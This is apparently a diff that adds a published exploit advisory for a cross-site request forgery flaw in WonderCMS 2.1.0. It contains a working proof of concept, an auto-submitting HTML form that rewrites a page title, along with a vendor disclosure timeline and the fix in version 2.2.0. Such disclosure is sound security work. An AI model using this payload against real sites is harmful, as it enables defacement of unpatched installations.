@@ -1,0 +1,60 @@
+<!--
+# Exploit Title: Cross-Site Request Forgery in WonderCMS
+# Date: 2017-06-19
+# Exploit Author: Zerox Security Lab
+# Software Link: https://www.wondercms.com
+# Version: 2.1.0
+# Twitter: https://twitter.com/ZeroxSecLab
+
+0xCode Lab ID:
+---------------
+0xC-201706-002
+
+Introduction:
+-------------
+WonderCMS is a free open source Content Management System. In other
+words, WonderCMS is a free website builder.
+WonderCMS doesn't require any configuration and can be simply unzipped
+and uploaded to your hosting provider. The database is a text file
+which you can copy, move, backup and restore easily.
+
+Proof of Concept (PoC):
+------------------------
+-->
+<html>
+<body>
+<form action="http://localhost/wonder/" method="post">
+	<input name="fieldname" value="title">
+	<input name="content" value="Hacked By 0xCode Security Lab">
+	<input name="target" value="pages">
+	<input type="submit" value="ok">
+</form>
+</body>
+</html>
+<script>
+	document.forms[0].submit();
+</script>
+<!--
+Disclosure Timeline:
+---------------------
+2017-06-16: Vulnerability found.
+2017-06-17: Reported to vendor.
+2017-06-17: Vendor responded and send a new version for test in it.
+2017-06-17: Test new version and vulernability patched successfully.
+2017-06-18: Vendor responded, update released.
+2017-06-19: Public Disclosure.
+
+Fix:
+----
+This issue fixed in WonderCMS 2.2.0
+
+References:
+------------
+https://www.wondercms.com/whatsnew
+https://www.wondercms.com/forum/viewtopic.php?f=8&t=885
+https://github.com/robiso/wondercms/issues/36
+
+Credits & Authors:
+------------------
+Zerox Security Lab
+-->
